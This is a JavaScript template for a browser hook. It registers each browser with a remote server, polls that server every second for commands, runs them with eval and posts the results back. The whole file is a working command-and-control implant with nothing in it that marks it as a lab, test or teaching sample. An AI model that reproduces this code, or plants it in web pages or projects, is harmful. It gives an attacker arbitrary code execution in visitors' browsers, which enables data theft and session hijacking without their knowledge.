{% include 'jquery.min.js' %}
{% include 'prune.js' %}

! function foo(config) {

    /* Eval Context */
    this.context = {};
    this.url = config.url + ':' + config.port;

    /* Logging functions */
    this.log = function (text) {
        if (config["debug"]) {
            console.log("debug: ", text)
        }
    };
    this.err = function (errText) {
        console.log("error: ", errText)
    };

    /* get a unique identifier */
    this.getUUID = function () {
        function s4() { return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1); }
        return s4() + s4() + '-' + s4() + '-' + s4() + '-' + s4() + '-' + s4() + s4() + s4();
    };

    /* register as a new client */
    this.register = function () {

        var formData = {
            'uuid': this.getUUID(),
            'user_agent' : navigator.userAgent
            };

        $.ajax({
            url: this.url + '/register',
            type: "POST",
            data: formData,
            context: this,
            success: function (data, textStatus, jqXHR) {
                this.log(data);
            },
            error: function (jqXHR, textStatus, errorThrown) {
                this.err(textStatus);
            }
        });

        this.id = formData['uuid'];
    };

    /* fetch a new command from the command queue */
    this.getCommand = function() {

        $.ajax({
            url: this.url + '/get_command/' + this.id,
            type: "GET",
            dataType: 'json',
            context: this,
            success: function (data, textStatus, jqXHR) {
                if (!('error' in data ) && ('success' in data))
                {
                    var cmd = data['success'];
                    var cmd_id = data['cmd_id'];
                    this.exec(cmd, cmd_id);
                }

                this.log(data);
            },
            error: function (jqXHR, textStatus, errorThrown) {
                this.err(textStatus);
            }
        })
    };

    /* executes a command in the eval context */
    this.exec = function(cmd, cmd_id) {
        try {

            var out = eval.call(this.context, cmd);
            // var out = this.evalInContext(cmd,this.context);

            var js = JSON.prune(out);

            this.postBack({'output' : js, 'cmd_id' : cmd_id, 'uuid' : this.id});
        }
        catch(err) {
            this.postBack({'output' : err.message, 'cmd_id' : cmd_id, 'uuid' : this.id});
        }
    };


    /* when a command has finished executing, post it back to the server */
    this.postBack = function(data) {

        $.ajax({
            url: this.url + '/post_back',
            type: "POST",
            data: data,
            context: this,
            success: function (data, textStatus, jqXHR) {
                this.log(data);
            },
            error: function (jqXHR, textStatus, errorThrown) {
                this.err(errorThrown);
            }
        });
    };

    /* Main */
    this.register();
    setInterval(this.getCommand, 1000);

}({
    'debug' : {{ debug }},
    'url' : '{{ url }}',
    'port' : '{{ port }}'
});
